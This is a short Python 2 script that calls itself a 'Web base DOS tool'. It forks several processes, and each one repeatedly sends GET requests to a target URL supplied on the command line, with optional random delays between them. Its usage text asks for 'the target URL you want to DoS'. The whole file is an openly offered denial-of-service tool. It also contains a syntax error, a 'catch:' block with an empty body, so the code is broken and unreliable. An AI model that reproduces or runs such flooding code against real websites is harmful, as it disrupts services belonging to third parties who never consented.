#!/usr/bin/python
# 
# Web base DOS tool
# 
# 

import getopt, sys, os, time, random
import httplib2

CONFIG = {'url'       : None,
          'processes' : 1,
          'requests'  : 10,
          'randfact'  : 0,
         }

def usage():
    print "-h: This message."
    print "-u <URL>: The target URL you want to DoS"
    print "-p <procs>: The number of processes to spawn [%s]"%(CONFIG['processes'])
    print "-r <requests>: The number of requests to make per processes [%s]"%(CONFIG['requests'])
    print "i.e. user@user:~/$ python dos.py -u http://www.target.com"

def dos_fork(fid):
    child_pid = os.fork()
    if child_pid == 0:
        print "  Beginning request process [%s:%s]"%(fid, os.getpid())
        
        for i in range(CONFIG['requests']):
            if (CONFIG['randfact'] > 0):
                time.sleep( random.random() * CONFIG['randfact'])
            
            start_time = time.time()
            
            print("[{:>4}:{:>6}] r{:<4}".format(fid, os.getpid(), i)),
            
            h = httplib2.Http(".cache")
            try:
                resp, content = h.request(CONFIG['url'], "GET")
            catch:
                
            
            end_time = time.time()
            elapsed_time = (end_time - start_time)
            print("time: {:7.4f} seconds, size {:6} bytes".format(elapsed_time, resp['content-length']))
            #print content
        
        # End forked process - otherwise we'll end up in a forkbomb
        # situation.
        os._exit(0)
        

if __name__ == "__main__":
    # Verify arguments
    try:
        opts, args = getopt.getopt(sys.argv[1:], "hu:p:r:f:")
    except getopt.GetoptError, err:
        print str(err)
        exit()
    
    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
            exit()
        elif o in ("-u", "--url"):
            print("1 %s, %s"%( o, a))
            CONFIG['url'] = a
        elif o in ("-p", "--processes"):
            CONFIG['processes'] = int(a)
        elif o in ("-r", "--requests"):
            CONFIG['requests'] = int(a)
        elif o in ("-f", "--randfact"):
            CONFIG['randfact'] = float(a)
        else:
            print "Unknown option %s"%o
            usage()
            exit()
    
    if (CONFIG['url'] == None):
        print "-u option required"
        usage()
        exit()
    
    for i in range(CONFIG['processes']):
        print "Spawning request process %s"%i
        dos_fork(i)
    
    
